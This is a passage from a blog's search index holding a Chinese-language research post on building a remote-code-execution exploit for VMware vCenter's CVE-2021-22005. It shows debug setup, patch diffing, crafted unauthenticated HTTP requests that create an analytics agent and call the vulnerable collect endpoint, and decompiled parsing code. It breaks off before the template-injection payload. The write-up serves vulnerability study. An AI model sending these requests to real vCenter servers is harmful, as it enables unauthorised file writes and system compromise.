<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Vmware-Vcenter漏洞追踪之CVE-2021-22005</title>
    <link href="/2022/Research-Vmware-Vcenter&#39;s-vulnerability-CVE-2021-22005/"/>
    <url>/2022/Research-Vmware-Vcenter&#39;s-vulnerability-CVE-2021-22005/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在CVE-2021-22005 刚爆出来时，testbnull师傅分析了漏洞的前半部分，但是没有给出最后的RCE方法。由于自己之前也分析过Vcenter的其他几个洞，所以当时就花了些时间看了下，最终使用getAppender()拿到变量成功完成了RCE EXP的构造。而后圈子里对该漏洞的关注度小了很多，也有些师傅陆陆续续公开了POC&#x2F;EXP，索性就将我当时调试情况及后来的补充分析整理成文一并发出来。当时分析完后感觉，如果单纯通过审计能挖出来这洞真的太强了，而使用收集流量数据+审计代码去构造数据包 难度应该会小很多。在测试过程当中断点收到了系统发的请求流量，根据这些也可以很快定位到最终的resourceItemToJsonLdMapping对象进行模板注入</p></blockquote><p><strong>PS：本文仅用于技术讨论。严禁用于任何非法用途，违者后果自负。</strong></p><h2 id="1、环境调试"><a href="#1、环境调试" class="headerlink" title="1、环境调试"></a>1、环境调试</h2><blockquote><p>复现版本：VMware VirtualCenter 6.7.0 build-17028632  linux平台 </p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>vmware<span class="hljs-regexp">/vmware-vmon/</span>svcCfgfiles/analytics.json<br><span class="hljs-string">&quot;-Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006&quot;</span>,<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/1.png">  </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css">重启服务<br>service-control <span class="hljs-attr">--restart</span> vmware-analytics<br><br>开启防火墙<br>iptables -<span class="hljs-selector-tag">I</span> OUTPUT -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">5006</span> -j ACCEPT<br>iptables -<span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">5006</span> -j ACCEPT<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/2.png">  </p><p>成功断点调试：<br><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/3.png">  </p><p>如果不行就直接上命令开启调试：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>java<span class="hljs-regexp">/jre-vmware/</span>bin<span class="hljs-regexp">/vmware-analytics.launcher -Xmx128m -XX:CompressedClassSpaceSize=64m -Xss256k -XX:ParallelGCThreads=1 -Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=9999 -Dorg.apache.catalina.startup.EXIT_ON_INIT_FAILURE=TRUE -Danalytics.logDir=/</span>var<span class="hljs-regexp">/log/</span>vmware<span class="hljs-regexp">/analytics -Danalytics.dataDir=/</span>storage<span class="hljs-regexp">/analytics -Danalytics.deploymentNodeTypeFile=/</span>etc<span class="hljs-regexp">/vmware/</span>deployment.node.type -Danalytics.buildInfoFile=<span class="hljs-regexp">/etc/</span>vmware<span class="hljs-regexp">/.buildInfo -Danalytics.agentsDir=/</span>etc<span class="hljs-regexp">/vmware-analytics/</span>agents -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/vmware/</span>analytics -XX:ErrorFile=<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/vmware/</span>analytics<span class="hljs-regexp">/java_error.log -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintReferenceGC -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=10 -XX:GCLogFileSize=1024K -Xloggc:/</span>var<span class="hljs-regexp">/log/</span>vmware<span class="hljs-regexp">/analytics/</span>vmware-analytics-gc.log -Djava.security.properties=<span class="hljs-regexp">/etc/</span>vmware<span class="hljs-regexp">/java/</span>vmware-override-java.security -Djava.ext.dirs=<span class="hljs-regexp">/usr/</span>java<span class="hljs-regexp">/jre-vmware/</span>lib<span class="hljs-regexp">/ext:/u</span>sr<span class="hljs-regexp">/java/</span>packages<span class="hljs-regexp">/lib/</span>ext:<span class="hljs-regexp">/opt/</span>vmware<span class="hljs-regexp">/jre_ext/</span> -classpath <span class="hljs-regexp">/etc/</span>vmware-analytics:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware-analytics/</span>lib<span class="hljs-regexp">/*:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware-analytics<span class="hljs-regexp">/lib:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>tomcat-embed-core-<span class="hljs-number">8.5</span>.<span class="hljs-number">56</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/tomcat-annotations-api-8.5.56.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>antlr-<span class="hljs-number">2.7</span>.<span class="hljs-number">7</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/antlr-runtime.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>aspectjrt.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/bcprov-jdk16-145.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-codec-<span class="hljs-number">1.6</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/commons-collections-3.2.2.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-collections4-<span class="hljs-number">4.1</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/commons-compress-1.8.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-io-<span class="hljs-number">2.1</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/commons-lang-2.6.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-lang3-<span class="hljs-number">3.4</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/commons-logging-1.1.3.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-pool-<span class="hljs-number">1.6</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/custom-rolling-file-appender-1.0.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>featureStateSwitch-<span class="hljs-number">1.0</span>.<span class="hljs-number">0</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/guava-18.0.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>httpasyncclient-<span class="hljs-number">4.1</span>.<span class="hljs-number">3</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/httpclient-4.5.3.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>httpcore-<span class="hljs-number">4.4</span>.<span class="hljs-number">6</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/httpcore-nio-4.4.6.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>httpmime-<span class="hljs-number">4.5</span>.<span class="hljs-number">3</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/jackson-annotations-2.10.4.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>jackson-core-<span class="hljs-number">2.10</span>.<span class="hljs-number">4</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/jackson-databind-2.10.4.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>jna.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/log4j-1.2.16.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>log4j-core-<span class="hljs-number">2.8</span>.<span class="hljs-number">2</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/log4j-api-2.8.2.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>platform.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/slf4j-api-1.7.30.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>slf4j-log4j12-<span class="hljs-number">1.7</span>.<span class="hljs-number">30</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/spring-aop-4.3.27.RELEASE.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>spring-beans-<span class="hljs-number">4.3</span>.<span class="hljs-number">27</span>.RELEASE.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/spring-context-4.3.27.RELEASE.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>spring-core-<span class="hljs-number">4.3</span>.<span class="hljs-number">27</span>.RELEASE.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/spring-expression-4.3.27.RELEASE.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>spring-web-<span class="hljs-number">4.3</span>.<span class="hljs-number">27</span>.RELEASE.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/spring-webmvc-4.3.27.RELEASE.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>velocity-<span class="hljs-number">1.7</span>.jar com.vmware.ph.phservice.service.Main ph-properties-loader.xml ph-featurestate.xml phservice.xml ph-web.xml<br></code></pre></td></tr></table></figure><h2 id="2、补丁分析"><a href="#2、补丁分析" class="headerlink" title="2、补丁分析"></a>2、补丁分析</h2><p>vmware在9月24日发布了<a href="https://www.vmware.com/security/advisories/VMSA-2021-0020.html">安全通告</a>，修复了vcenter的多个漏洞，其中CVE-2021-22005 任意文件上传获得严重漏洞 9.8评分，通过描述看到，攻击者可以未授权请求443端口上传文件。且此漏洞并不影响vcenter 6.5 </p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/4.png"></p><p>可以看到漏洞关键字：Analytics service、443端口访问、文件上传执行命令、不影响6.5</p><p>补丁文章：<a href="https://kb.vmware.com/s/article/85717">https://kb.vmware.com/s/article/85717</a></p><p>对比代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>.<span class="hljs-number">7</span>\<span class="hljs-number">17028579</span>\vmware-analytics<br><span class="hljs-attribute">6</span>.<span class="hljs-number">7</span>\<span class="hljs-number">18485185</span>-new\vmware-analytics<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/5.png"></p><p><code>analytics-cloud-dataapp-server-6.7.0.jar\com\vmware\ph\phservice\cloud\dataapp\server\DataAppAgentController.class</code></p><p>删除了DataAppAgentController.class的collect()方法</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/6.png"></p><p>查看存在漏洞的版本代码：</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/7.png"></p><p>另外补丁还在实例化DataAppAgentId类时，使用isValidCollectorId及isValidCollectorInstanceId检查传入的collectorId及collectorInstanceId是否符合要求</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/8.png"></p><p>com.vmware.ph.phservice.common.internal.IdFormatUtil</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/9.png"></p><p>使用<code>java.util.regex.Pattern</code>对字符串进行正则匹配，不符合要求则无法实例化DataAppAgentId对象；</p><p>另外一段变化代码，发生在<code>analytics-push-telemetry-server-6.7.0.jar\com\vmware\ph\phservice\push\telemetry\server\AsyncTelemetryController.class</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/10.png"></p><p>变化点：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">vmware-analytics\lib\sources\<span class="hljs-keyword">com</span>\vmware\ph\phservice\<span class="hljs-keyword">push</span>\telemetry\server\AsyncTelemetryController<span class="hljs-meta">#handleSendRequest()</span><br><br><span class="hljs-symbol">collectorInstanceId:</span><br>IdFormatUtil.isValidCollectorInstanceId(collectorInstanceId)  正则限制<br><br><span class="hljs-symbol">collectorId:</span><br>_collectorIdWhitelist.contains(collectorId)  白名单限制<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/11.png"></p><p>该漏洞的临时解决方案：</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/12.png"></p><p>本文对<code>/analytics/ph/api/dataapp/agent?action=collect</code>漏洞部分进行分析，查看rhttpproxy代理关于analytics服务的路由(<code>/etc/vmware-rhttpproxy/endpoints.conf.d/analytics-proxy.conf</code>)：</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/13.png"></p><p>允许&#x2F;analytics访问。其实经过测试版本vmware vcenter 6.7并不需要使用..;去访问漏洞接口的</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/14.png"></p><h2 id="3、命令执行-数据构造"><a href="#3、命令执行-数据构造" class="headerlink" title="3、命令执行 数据构造"></a>3、命令执行 数据构造</h2><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/15.png"></p><h3 id="3-1-创建agent"><a href="#3-1-创建agent" class="headerlink" title="3.1 创建agent"></a>3.1 创建agent</h3><p>补丁删除的漏洞方法是：analytics-cloud-dataapp-server-6.7.0.jar\com\vmware\ph\phservice\cloud\dataapp\server\DataAppAgentController.class#collect()</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/16.png"></p><p>构造基础数据包测试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST <span class="hljs-regexp">/analytics/</span>ph<span class="hljs-regexp">/api/</span>dataapp<span class="hljs-regexp">/agent?action=collect&amp;_c=abc&amp;_i=test HTTP/</span><span class="hljs-number">1.1</span><br>...<br>Content-Type: application/json<br>X-Deployment-Secret: abc<br>Content-Length: <span class="hljs-number">65</span><br><br>&#123;<span class="hljs-string">&quot;manifestContent&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;contextData&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;objectId&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>122行会去调用<code>com.vmware.ph.phservice.cloud.dataapp.DefaultDataAppAgentManager#getAgent</code>获取agent</p><blockquote><p>系统会去&#x2F;etc&#x2F;vmware-analytics&#x2F;agents寻找 parameter[_c]+ header[X-Plugin-Type] + “.properties” 文件，这里我们未传入请求头X-Plugin-Type，所以会去寻找&#x2F;etc&#x2F;vmware-analytics&#x2F;agents&#x2F;abc.properties文件</p></blockquote><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/17.png"></p><p>com.vmware.ph.phservice.cloud.dataapp.repository.FileSystemAgentRepository#get()</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/18.png"></p><p>但是<code>/etc/vmware-analytics/agents/abc.properties</code>并不存在，所以会直接报“Did not find agent matching the provided parameters.”的错误</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/19.png"></p><p>我们可以使用系统自带的vsphere_health.properties，但是为了多个版本的适配，我们最好选择使用<code>com.vmware.ph.phservice.cloud.dataapp.server.DataAppAgentController#create()</code>去创建一个</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/20.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/21.png"></p><p>构造数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/analytics/ph/api/dataapp/agent?_c=abc&amp;_i=test</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.232.196<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">X-Deployment-Secret</span><span class="hljs-punctuation">: </span>abc<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>249<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;manifestSpec&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;objectType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;collectionTriggerDataNeeded&quot;</span><span class="hljs-punctuation">:</span>  <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;deploymentDataNeeded&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;resultNeeded&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;signalCollectionCompleted&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;localManifestPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;localPayloadPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;localObfuscationMapPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/22.png"></p><p>成功创建abc.properties，然后再调用collect请求就正常了</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/23.png"></p><p>网上对该漏洞的绝大多数分析文章都是直接跳到velocity模板注入部分，并没有讲述如何从0去构建一个EXP，我们还是一步一步来构造下。开始执行collect()操作的是在<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.DefaultCollectorDataAppAgent#collect()</code>. EXP分几个关键部分去讲解，依次是：创建agent、XML数据构造、Velocity模板注入</p><h3 id="3-2-XML数据构造"><a href="#3-2-XML数据构造" class="headerlink" title="3.2 XML数据构造"></a>3.2 XML数据构造</h3><p>解析XML调用栈：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs axapta">com.vmware.ph.phservice.cloud.dataapp.<span class="hljs-keyword">server</span>.DataAppAgentController<span class="hljs-meta">#collect </span><br>    collectedData = ((CollectorDataAppAgent)agent).collect(manifestContent, objectId, jsonLdContextData); <span class="hljs-comment">//方法参数由POST传入</span><br>com.vmware.ph.phservice.cloud.dataapp.<span class="hljs-keyword">internal</span>.collector.DefaultCollectorDataAppAgent<span class="hljs-meta">#collect  </span><br>    List&lt;CollectionSpec&gt; collectionSpecs = <span class="hljs-keyword">this</span>.createCollectionSpecs(<span class="hljs-keyword">this</span>._dataApp, objectIdToContextData, CollectionTriggerType.ON_DEMAND, inMemoryManifestContentProvider, inMemoryUploadStrategy, <span class="hljs-literal">true</span>);<br>    Collector collector = <span class="hljs-keyword">this</span>.createCollector(collectionSpecs, (CollectionSchedule)<span class="hljs-literal">null</span>, CollectionTriggerType.ON_DEMAND);<br><br>    outcome = collector.collect();<br></code></pre></td></tr></table></figure><p>着重对<code>collector.collect()</code>进行分析，实际完成操作的是在：com.vmware.ph.phservice.collector.internal.core.ConnectionClosingCollectorWrapper#collect()中</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/24.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/25.png"></p><p>跟入collect()：<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.SpecsCollector#collect() —&gt;com.vmware.ph.phservice.cloud.dataapp.internal.collector.SpecsCollector#collectAndSend()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/26.png"></p><p>​    这个方法有两步重要操作，第一步根据xml数据构建Manifest对象。第二步对manifestToExecute进行收集操作。先分析第一步XML构造</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/27.png"></p><h4 id="3-2-1-根据XML数据还原Manifest对象"><a href="#3-2-1-根据XML数据还原Manifest对象" class="headerlink" title="3.2.1 根据XML数据还原Manifest对象"></a>3.2.1 根据XML数据还原Manifest对象</h4><p>在<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.CollectionTriggerTypeManifestParser#getManifest()</code>方法中，根据用户传入的<code>manifestContent</code>内容，系统使用不同的解析器（<code>XmlManifestParser、VsanHealthJsonManifestParser、VsanPerformanceJsonManifestParser</code>）去解析</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/28.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/29.png"></p><p>筛选规则在解析器类的isApplicable()中</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.collector</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.manifest</span><span class="hljs-selector-class">.xml</span>.XmlManifestParser<span class="hljs-selector-id">#isApplicable</span><br>com<span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.dataapp</span><span class="hljs-selector-class">.vsan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.collector</span>.VsanHealthJsonManifestParser<span class="hljs-selector-id">#isApplicable</span><span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.dataapp</span><span class="hljs-selector-class">.vsan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.collector</span>.VsanPerformanceJsonManifestParser#isApplicable<br></code></pre></td></tr></table></figure><p>​                                                                                                   <img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/30.png"> </p><p>接着调用解析器的getManifest()，即<code>com.vmware.ph.phservice.collector.internal.manifest.xml.XmlManifestParser#getManifest()</code>，在这个方法中规定了各个标签内容，依次为：<code>&lt;requestSchedules&gt;、&lt;request&gt;、&lt;cdfmapping&gt;</code></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public Manifest get<span class="hljs-constructor">Manifest(String <span class="hljs-params">manifestStr</span>, CollectionSchedule <span class="hljs-params">schedule</span>)</span> &#123;<br>   <span class="hljs-comment">//1、限制必须包含&lt;requestSchedules&gt;</span><br>        Document manifestDoc = get<span class="hljs-constructor">ManifestDocForSchedule(<span class="hljs-params">manifestStr</span>, <span class="hljs-params">schedule</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_isLegacySchedulingSupported</span>)</span>;<br>        <span class="hljs-keyword">if</span> (manifestDoc<span class="hljs-operator"> == </span>null) &#123;<br>            return null;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            NamedQuery<span class="hljs-literal">[]</span> queries = parse<span class="hljs-constructor">Queries(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_requestParser</span>)</span>;<br>            NamedQuery<span class="hljs-literal">[]</span> queriesForSchedule = this.get<span class="hljs-constructor">NamedQueriesForSchedule(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">schedule</span>, <span class="hljs-params">queries</span>)</span>;<br>            <span class="hljs-comment">//2、限制&lt;request&gt;标签必须包含一个&lt;query&gt;标签</span><br>            <span class="hljs-keyword">if</span> (queriesForSchedule != null<span class="hljs-operator"> &amp;&amp; </span>queriesForSchedule.length != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">//3、解析&lt;cdfmapping&gt;标签，这个是需要放payload的标签</span><br>                NamedQueryResultSetMapping&lt;Payload20&gt; cdfNamedQueryMapping = get<span class="hljs-constructor">CdfNamedQueryMapping(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_cdfMappingParser</span>)</span>;<br>                NamedQueryResultSetMapping&lt;File&gt; fileNamedQueryMapping = get<span class="hljs-constructor">FileNamedQueryMapping(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_fileMappingParser</span>)</span>;<br>                List&lt;ObfuscationRule&gt; obfuscationRules = parse<span class="hljs-constructor">ObfuscationRules(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_obfuscationRulesParser</span>)</span>;<br>                <span class="hljs-built_in">int</span> recommendedPageSize = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XmlManifestUtils</span>.</span></span>get<span class="hljs-constructor">RecommendedPageSize(<span class="hljs-params">manifestDoc</span>, 5000)</span>;<br>                <br>                Manifest result = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Builder</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Queries(<span class="hljs-params">queriesForSchedule</span>)</span>.<span class="hljs-keyword">with</span><span class="hljs-constructor">CdfMapping(<span class="hljs-params">getNonNullNamedQueryResultSetMapping</span>(<span class="hljs-params">cdfNamedQueryMapping</span>)</span>).<span class="hljs-keyword">with</span><span class="hljs-constructor">FileMapping(<span class="hljs-params">getNonNullNamedQueryResultSetMapping</span>(<span class="hljs-params">fileNamedQueryMapping</span>)</span>).<span class="hljs-keyword">with</span><span class="hljs-constructor">ObfuscationRules(<span class="hljs-params">getNonNullObfuscationRules</span>(<span 